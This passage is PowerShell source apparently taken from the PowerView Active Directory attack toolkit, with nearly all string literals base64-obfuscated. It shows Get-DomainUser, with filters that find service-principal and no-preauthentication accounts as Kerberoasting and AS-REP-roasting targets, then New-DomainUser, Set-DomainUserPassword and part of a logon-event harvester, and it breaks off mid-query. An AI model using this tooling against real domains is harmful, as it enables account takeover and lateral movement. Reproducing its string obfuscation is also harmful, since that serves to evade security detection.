        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SchemaArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
        if ($TargetForest) {
            $SchemaArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Rm9yZXN0")))] = $TargetForest
        }
    }

    PROCESS {

        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVmZXJlbmNlUHJvcGVydHlTZXQ=")))]) {
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluT2JqZWN0UHJvcGVydHlPdXRsaWVyXSBVc2luZyBzcGVjaWZpZWQgLVJlZmVyZW5jZVByb3BlcnR5U2V0")))
            $ReferenceObjectProperties = $ReferencePropertySet
        }
        elseif ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVmZXJlbmNlT2JqZWN0")))]) {
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluT2JqZWN0UHJvcGVydHlPdXRsaWVyXSBFeHRyYWN0aW5nIHByb3BlcnR5IG5hbWVzIGZyb20gLVJlZmVyZW5jZU9iamVjdCB0byB1c2UgYXMgdGhlIHJlZmVyZW5jZSBwcm9wZXJ0eSBzZXQ=")))
            $ReferenceObjectProperties = Get-Member -InputObject $ReferenceObject -MemberType NoteProperty | Select-Object -Expand Name
            $ReferenceObjectClass = $ReferenceObject.objectclass | Select-Object -Last 1
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluT2JqZWN0UHJvcGVydHlPdXRsaWVyXSBDYWxjdWxhdGVkIFJlZmVyZW5jZU9iamVjdENsYXNzIDogJFJlZmVyZW5jZU9iamVjdENsYXNz")))
        }
        else {
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluT2JqZWN0UHJvcGVydHlPdXRsaWVyXSBVc2luZyB0aGUgZGVmYXVsdCByZWZlcmVuY2UgcHJvcGVydHkgc2V0IGZvciB0aGUgb2JqZWN0IGNsYXNzICckQ2xhc3NOYW1l")))
        }

        if (($ClassName -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcg==")))) -or ($ReferenceObjectClass -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcg=="))))) {
            $Objects = Get-DomainUser @SearcherArguments
            if (-not $ReferenceObjectProperties) {
                $ReferenceObjectProperties = $UserReferencePropertySet
            }
        }
        elseif (($ClassName -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXA=")))) -or ($ReferenceObjectClass -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXA="))))) {
            $Objects = Get-DomainGroup @SearcherArguments
            if (-not $ReferenceObjectProperties) {
                $ReferenceObjectProperties = $GroupReferencePropertySet
            }
        }
        elseif (($ClassName -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXI=")))) -or ($ReferenceObjectClass -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXI="))))) {
            $Objects = Get-DomainComputer @SearcherArguments
            if (-not $ReferenceObjectProperties) {
                $ReferenceObjectProperties = $ComputerReferencePropertySet
            }
        }
        else {
            throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluT2JqZWN0UHJvcGVydHlPdXRsaWVyXSBJbnZhbGlkIGNsYXNzOiAkQ2xhc3NOYW1l")))
        }

        ForEach ($Object in $Objects) {
            $ObjectProperties = Get-Member -InputObject $Object -MemberType NoteProperty | Select-Object -Expand Name
            ForEach($ObjectProperty in $ObjectProperties) {
                if ($ReferenceObjectProperties -NotContains $ObjectProperty) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2FtQWNjb3VudE5hbWU="))) $Object.SamAccountName
                    $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydHk="))) $ObjectProperty
                    $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VmFsdWU="))) $Object.$ObjectProperty
                    $Out.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LlByb3BlcnR5T3V0bGllcg=="))))
                    $Out
                }
            }
        }
    }
}








function Get-DomainUser {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [Switch]
        $SPN,

        [Switch]
        $AdminCount,

        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        $AllowDelegation,

        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        $DisallowDelegation,

        [Switch]
        $TrustedToAuth,

        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        $PreauthNotRequired,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    DynamicParam {
        $UACValueNames = [Enum]::GetNames($UACEnum)
        
        $UACValueNames = $UACValueNames | ForEach-Object {$_; (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tk9UX3swfQ=="))) -f $_)}
        
        New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
    }

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] = $Properties }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))] = $SecurityMasks }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
        $UserSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters
        }

        if ($UserSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KA=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI4")))).Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KQ=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI5"))))
                if ($IdentityInstance -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XlMtMS0=")))) {
                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdHNpZD0kSWRlbnRpdHlJbnN0YW5jZSk=")))
                }
                elseif ($IdentityInstance -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XkNOPQ==")))) {
                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGRpc3Rpbmd1aXNoZWRuYW1lPSRJZGVudGl0eUluc3RhbmNlKQ==")))
                    if ((-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) -and (-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))])) {
                        
                        
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
                        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Vc2VyXSBFeHRyYWN0ZWQgZG9tYWluICckSWRlbnRpdHlEb21haW4nIGZyb20gJyRJZGVudGl0eUluc3RhbmNl")))
                        $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $IdentityDomain
                        $UserSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $UserSearcher) {
                            Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Vc2VyXSBVbmFibGUgdG8gcmV0cmlldmUgZG9tYWluIHNlYXJjaGVyIGZvciAnJElkZW50aXR5RG9tYWlu")))
                        }
                    }
                }
                elseif ($IdentityInstance -imatch ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XlswLTlBLUZdezh9LShbMC05QS1GXXs0fS0pezN9WzAtOUEtRl17MTJ9JA==")))) {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))) + $_.ToString(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WDI=")))) }) -join ''
                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdGd1aWQ9JEd1aWRCeXRlU3RyaW5nKQ==")))
                }
                elseif ($IdentityInstance.Contains(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))) {
                    $ConvertedIdentityInstance = $IdentityInstance.Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI4"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KA==")))).Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI5"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KQ==")))) | Convert-ADName -OutputType Canonical
                    if ($ConvertedIdentityInstance) {
                        $UserDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lw==")))))
                        $UserName = $IdentityInstance.Split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))[1]
                        $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHNhbUFjY291bnROYW1lPSRVc2VyTmFtZSk=")))
                        $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $UserDomain
                        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Vc2VyXSBFeHRyYWN0ZWQgZG9tYWluICckVXNlckRvbWFpbicgZnJvbSAnJElkZW50aXR5SW5zdGFuY2U=")))
                        $UserSearcher = Get-DomainSearcher @SearcherArguments
                    }
                }
                else {
                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHNhbUFjY291bnROYW1lPSRJZGVudGl0eUluc3RhbmNlKQ==")))
                }
            }

            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHwkSWRlbnRpdHlGaWx0ZXIp")))
            }

            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U1BO")))]) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Vc2VyXSBTZWFyY2hpbmcgZm9yIG5vbi1udWxsIHNlcnZpY2UgcHJpbmNpcGFsIG5hbWVz")))
                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHNlcnZpY2VQcmluY2lwYWxOYW1lPSop")))
            }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxsb3dEZWxlZ2F0aW9u")))]) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Vc2VyXSBTZWFyY2hpbmcgZm9yIHVzZXJzIHdobyBjYW4gYmUgZGVsZWdhdGVk")))
                
                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCEodXNlckFjY291bnRDb250cm9sOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTEwNDg1NzQpKQ==")))
            }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGlzYWxsb3dEZWxlZ2F0aW9u")))]) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Vc2VyXSBTZWFyY2hpbmcgZm9yIHVzZXJzIHdobyBhcmUgc2Vuc2l0aXZlIGFuZCBub3QgdHJ1c3RlZCBmb3IgZGVsZWdhdGlvbg==")))
                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj0xMDQ4NTc0KQ==")))
            }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRtaW5Db3VudA==")))]) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Vc2VyXSBTZWFyY2hpbmcgZm9yIGFkbWluQ291bnQ9MQ==")))
                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGFkbWluY291bnQ9MSk=")))
            }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VHJ1c3RlZFRvQXV0aA==")))]) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Vc2VyXSBTZWFyY2hpbmcgZm9yIHVzZXJzIHRoYXQgYXJlIHRydXN0ZWQgdG8gYXV0aGVudGljYXRlIGZvciBvdGhlciBwcmluY2lwYWxz")))
                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG1zZHMtYWxsb3dlZHRvZGVsZWdhdGV0bz0qKQ==")))
            }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJlYXV0aE5vdFJlcXVpcmVk")))]) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Vc2VyXSBTZWFyY2hpbmcgZm9yIHVzZXIgYWNjb3VudHMgdGhhdCBkbyBub3QgcmVxdWlyZSBrZXJiZXJvcyBwcmVhdXRoZW50aWNhdGU=")))
                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj00MTk0MzA0KQ==")))
            }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Vc2VyXSBVc2luZyBhZGRpdGlvbmFsIExEQVAgZmlsdGVyOiAkTERBUEZpbHRlcg==")))
                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JExEQVBGaWx0ZXI=")))
            }

            
            $UACFilter | Where-Object {$_} | ForEach-Object {
                if ($_ -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tk9UXy4q")))) {
                    $UACField = $_.Substring(4)
                    $UACValue = [Int]($UACEnum::$UACField)
                    $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCEodXNlckFjY291bnRDb250cm9sOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PSRVQUNWYWx1ZSkp")))
                }
                else {
                    $UACValue = [Int]($UACEnum::$_)
                    $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj0kVUFDVmFsdWUp")))
                }
            }

            $UserSearcher.filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYoc2FtQWNjb3VudFR5cGU9ODA1MzA2MzY4KSRGaWx0ZXIp")))
            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Vc2VyXSBmaWx0ZXIgc3RyaW5nOiB7MH0="))) -f $($UserSearcher.filter))

            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmluZE9uZQ==")))]) { $Results = $UserSearcher.FindOne() }
            else { $Results = $UserSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmF3")))]) {
                    
                    $User = $_
                    $User.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LlVzZXIuUmF3"))))
                }
                else {
                    $User = Convert-LDAPProperty -Properties $_.Properties
                    $User.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LlVzZXI="))))
                }
                $User
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Vc2VyXSBFcnJvciBkaXNwb3Npbmcgb2YgdGhlIFJlc3VsdHMgb2JqZWN0OiB7MH0="))) -f $_)
                }
            }
            $UserSearcher.dispose()
        }
    }
}


function New-DomainUser {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $SamAccountName,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $AccountPassword,

        [ValidateNotNullOrEmpty()]
        [String]
        $Name,

        [ValidateNotNullOrEmpty()]
        [String]
        $DisplayName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Description,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $ContextArguments = @{
        'Identity' = $SamAccountName
    }
    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $ContextArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ContextArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
    $Context = Get-PrincipalContext @ContextArguments

    if ($Context) {
        $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context.Context)

        
        $User.SamAccountName = $Context.Identity
        $TempCred = New-Object System.Management.Automation.PSCredential(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YQ=="))), $AccountPassword)
        $User.SetPassword($TempCred.GetNetworkCredential().Password)
        $User.Enabled = $True
        $User.PasswordNotRequired = $False

        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TmFtZQ==")))]) {
            $User.Name = $Name
        }
        else {
            $User.Name = $Context.Identity
        }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGlzcGxheU5hbWU=")))]) {
            $User.DisplayName = $DisplayName
        }
        else {
            $User.DisplayName = $Context.Identity
        }

        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVzY3JpcHRpb24=")))]) {
            $User.Description = $Description
        }

        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W05ldy1Eb21haW5Vc2VyXSBBdHRlbXB0aW5nIHRvIGNyZWF0ZSB1c2VyICckU2FtQWNjb3VudE5hbWU=")))
        try {
            $Null = $User.Save()
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W05ldy1Eb21haW5Vc2VyXSBVc2VyICckU2FtQWNjb3VudE5hbWUnIHN1Y2Nlc3NmdWxseSBjcmVhdGVk")))
            $User
        }
        catch {
            Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W05ldy1Eb21haW5Vc2VyXSBFcnJvciBjcmVhdGluZyB1c2VyICckU2FtQWNjb3VudE5hbWUnIDogezB9"))) -f $_)
        }
    }
}


function Set-DomainUserPassword {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('UserName', 'UserIdentity', 'User')]
        [String]
        $Identity,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $AccountPassword,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $ContextArguments = @{ 'Identity' = $Identity }
    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $ContextArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ContextArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
    $Context = Get-PrincipalContext @ContextArguments

    if ($Context) {
        $User = [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity($Context.Context, $Identity)

        if ($User) {
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1NldC1Eb21haW5Vc2VyUGFzc3dvcmRdIEF0dGVtcHRpbmcgdG8gc2V0IHRoZSBwYXNzd29yZCBmb3IgdXNlciAnJElkZW50aXR5")))
            try {
                $TempCred = New-Object System.Management.Automation.PSCredential(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YQ=="))), $AccountPassword)
                $User.SetPassword($TempCred.GetNetworkCredential().Password)

                $Null = $User.Save()
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1NldC1Eb21haW5Vc2VyUGFzc3dvcmRdIFBhc3N3b3JkIGZvciB1c2VyICckSWRlbnRpdHknIHN1Y2Nlc3NmdWxseSByZXNldA==")))
            }
            catch {
                Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1NldC1Eb21haW5Vc2VyUGFzc3dvcmRdIEVycm9yIHNldHRpbmcgcGFzc3dvcmQgZm9yIHVzZXIgJyRJZGVudGl0eScgOiB7MH0="))) -f $_)
            }
        }
        else {
            Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1NldC1Eb21haW5Vc2VyUGFzc3dvcmRdIFVuYWJsZSB0byBmaW5kIHVzZXIgJyRJZGVudGl0eQ==")))
        }
    }
}


function Get-DomainUserEvent {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogonEvent')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME,

        [ValidateNotNullOrEmpty()]
        [DateTime]
        $StartTime = [DateTime]::Now.AddDays(-1),

        [ValidateNotNullOrEmpty()]
        [DateTime]
        $EndTime = [DateTime]::Now,

        [ValidateRange(1, 1000000)]
        [Int]
        $MaxEvents = 5000,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        
        $XPathFilter = @"
<QueryList>
    <Query Id="0" Path="Security">

        <!-- Logon events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4624)
                    and TimeCreated[
                        @SystemTime&gt;='$($StartTime.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($EndTime.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
            and
            *[EventData[Data[@Name='TargetUserName'] != 'ANONYMOUS LOGON']]
        </Select>

        <!-- Logon with explicit credential events -->
        <Select Path="Security">
